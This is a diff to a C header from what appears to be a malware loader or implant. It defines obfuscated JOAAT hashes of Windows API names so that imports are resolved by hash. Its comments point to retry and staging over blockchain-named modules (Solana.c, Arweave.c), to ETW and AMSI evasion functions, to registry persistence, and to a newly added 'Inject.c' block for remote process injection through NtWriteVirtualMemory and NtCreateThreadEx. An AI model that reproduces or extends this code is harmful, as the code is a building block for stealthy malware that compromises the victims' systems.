@@ -58,7 +58,7 @@
 #define TpPostWork_JOAAT                0xBEF96313
 #define TpReleaseWork_JOAAT             0xBA0F3087
 
-// ----------- Sleep (used for retry delays in Solana.c / Staging.c) -----------
+// ----------- Sleep (used for retry delays in Arweave.c / Staging.c) -----------
 #define Sleep_JOAAT                     0x8EC35C06  // kernel32!Sleep
 
 // ----------- WinAPI Name Hashes -----------
@@ -67,7 +67,6 @@
 #define GetModuleHandleA_JOAAT          0x9D783EFE
 #define VirtualProtect_JOAAT            0x69B260D2
 #define EtwEventWrite_JOAAT             0xEF9B6F9B
-#define AmsiScanBuffer_JOAAT            0x725879AF
 
 // ----------- Bind File Discovery (kernel32 exports) -----------
 #define FindFirstFileA_JOAAT            0xBEB8D600
@@ -100,3 +99,9 @@
 #define RegOpenKeyExW_JOAAT             0x769D1396
 #define RegSetValueExW_JOAAT            0x941AFF2B
 #define RegCloseKey_JOAAT               0xFADC2D7D
+
+// ----------- Inject.c — Remote process injection (BUILD_DLL persistence path) -----------
+#define NtOpenProcess_JOAAT             0x61CF38BC
+#define NtWriteVirtualMemory_JOAAT      0x7A65C193
+#define NtCreateThreadEx_JOAAT          0xE5F15DAA
+#define NtQuerySystemInformation_JOAAT  0x62A8E2DE
